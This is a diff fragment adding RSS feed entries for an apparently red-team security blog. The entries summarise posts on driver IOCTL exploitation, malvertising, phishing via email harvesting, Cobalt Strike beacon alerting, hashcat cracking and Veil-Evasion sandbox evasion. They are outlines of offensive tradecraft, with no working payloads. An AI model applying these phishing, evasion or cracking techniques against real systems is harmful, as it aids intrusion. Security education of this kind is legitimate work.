+CreateFile() to initialize access to device through its symbolic ling Communication w/ : DeviceloControl() // IOCTL call WriteFile() // pass &amp;quot;stream&amp;quot; data ReadFile() // recieve &amp;quot;stream&amp;quot; data  Recent vulnerabilities such as OpenType Font Driver Vulnerability(CVE-2015-2426) are still making use of the ability to exploint DLL&amp;rsquo;s.</description>
+    </item>
+    
+    <item>
+      <title>Malvertizing Like a Pro BSidesAugusta2015</title>
+      <link>http://cybersyndicates.obscuritylabs.com/presentations/malvertizing-like-a-pro/</link>
+      <pubDate>Sun, 13 Sep 2015 21:38:17 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/presentations/malvertizing-like-a-pro/</guid>
+      <description>A Jump Into The Newest Attack Vector Recently at @BSidesAugusta I had the privilege to present my talk on Malvertizing and how I set out to verify my hypothesis. After some heavy research, time gathering as much possible information I decided it was time to take matters into my hands and bring some light to this major issue. Really trying to get people to talk about something that you rarely hear about in the info sec community.</description>
+    </item>
+    
+    <item>
+      <title>Quick and Dirty NMAP Commandline Menu</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/09/quick-and-dirty-nmap-commandline-menu/</link>
+      <pubDate>Sat, 12 Sep 2015 02:34:47 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/09/quick-and-dirty-nmap-commandline-menu/</guid>
+      <description>Quick and Dirty NMAP CommandLine Menu for enumerating hosts, ports, and services on a network. Works against individual IP&amp;rsquo;s, IP ranges (x.x.x.0-50), and traditional CIDRs. Outputs into separate files in the local directory. Can be adjusted and scaled. Any questions or assistance, feel free to email slacker007.dev@gmail.com or reply to post. Check out the code on GIT. https://github.com/slacker007/simpleNMAP
+********************************* Code Below *******************************
+import os import sys import subprocess chances = 4 end_prog = 0 def menu2(): cidr = raw_input(&amp;quot;Please enter the network cider or IP to be scanned EX:192.</description>
+    </item>
+    
+    <item>
+      <title>Advanced Active Monitoring with OSSEC</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/06/advance-active-monitoring-with-ossec/</link>
+      <pubDate>Sat, 20 Jun 2015 01:57:53 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/06/advance-active-monitoring-with-ossec/</guid>
+      <description>Tools Used For this tutorial.
+##############################################################
+OSSEC 2.8.2 (http://www.ossec.net)
+Ubuntu 14.04 (http://www.ubuntu.com/download/desktop)
+Gmail Account (https://www.gmail.com)
+Postfix (www.postfix.org)
+mailutils (installed from bash )
+##############################################################
+Step (1) Download Ubuntu 14.04 (Update: apt-get update; apt-get upgrade)
+Step (2) Download OSSEC 2.8.2 Software
+Step(2b) OPTIONAL Download Web UI 0.8
+Step(3) Install OSSEC Software
+ Two primary methods for installing OSSEC includes using the default settings (install.sh) or by manually installing it. Manual installation is simply just creating the required directories and copying the files into the OSSEC directory.</description>
+    </item>
+    
+    <item>
+      <title>Email Harvesting with HTML Scraping Module: theHarvester</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/06/email-harvesting-with-html-scraping-module-theharvester/</link>
+      <pubDate>Sun, 14 Jun 2015 01:26:31 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/06/email-harvesting-with-html-scraping-module-theharvester/</guid>
+      <description>After a recent Red Team training , I was faced with a issue where I had to conduct a Email phishing campaign to gain initial access using Email Harvesting. This isn&amp;rsquo;t anything necessarily new or a subject that has been touched on a million times. But my goal wasn&amp;rsquo;t to recreate the wheel or create a entirely new tool. I knew from past engagements that there are some great tools like theHarvester project out there:</description>
+    </item>
+    
+    <item>
+      <title>SMS-LogAlert.py - Alerting TeamServer Infrastructure</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/06/sms-log-alert/</link>
+      <pubDate>Wed, 10 Jun 2015 18:27:50 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/06/sms-log-alert/</guid>
+      <description>Recently on a red team engagement we where faced with a major issue during our initial access attempts while email phishing. We kept getting our Cobalt Strike (CS) beacon call backs to our team server at weird hours of the night, inherently missing the beacon and we were out of luck. The worst part was this was just about all we had to work with and we needed initial access bad!</description>
+    </item>
+    
+    <item>
+      <title>OclHashcat - Tutorial</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/06/oclhashcat-tutorial/</link>
+      <pubDate>Wed, 10 Jun 2015 18:04:20 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/06/oclhashcat-tutorial/</guid>
+      <description>HashCat Quick Start / Advanced Cracking Methods After the overwhelming amount of views on this subject I wanted to put together something a bit more detailed for those wanting to take it to the next level. When that list doesn&amp;rsquo;t work and you need to crack that has some methods can be used to reduce cycles and greatly increase the chance of success.
+Understanding the basics of OclHashcat and what you need to know to get started Types of cracking that matter:</description>
+    </item>
+    
+    <item>
+      <title>Veil-Evasion AES Encrypted HTTPKEY Request: Sand-Box Evasion</title>
+      <link>http://cybersyndicates.obscuritylabs.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/</link>
+      <pubDate>Wed, 10 Jun 2015 02:10:36 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/</guid>
+      <description>My buddy @christruncer set me up on a task to build a module that could be integrated into veil, and I was more than happy to help and contribute to the growing Framework that has been developed. It is becoming apparent that even though binaries are a secondary choice with newer advanced techniques to stay off disk, it’s always great to have a backup in case dropping a binary to disk is the last choice.</description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>http://cybersyndicates.obscuritylabs.com/page/about/</link>
+      <pubDate>Fri, 03 Apr 2015 02:13:50 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/page/about/</guid>
+      <description>About Cyber Syndicates is a (Cyber Blog) group of guys who love to try the latest Red Team, Blue Team and Hunt TTPs. We blog and drink a few beers along the way. We love pythin, C, C++ :)</description>
+    </item>
+    
+    <item>
+      <title>Contact</title>
+      <link>http://cybersyndicates.obscuritylabs.com/page/contact/</link>
+      <pubDate>Fri, 03 Apr 2015 02:13:50 +0000</pubDate>
+      
+      <guid>http://cybersyndicates.obscuritylabs.com/page/contact/</guid>
+      <description> Contact: @Killswitch-GUI
+ https://twitter.com/killswitch_gui https://github.com/killswitch-GUI https://keybase.io/killswitchgui https://www.linkedin.com/in/alexrymdekoharvey  </description>
     </item>
     
   </channel>
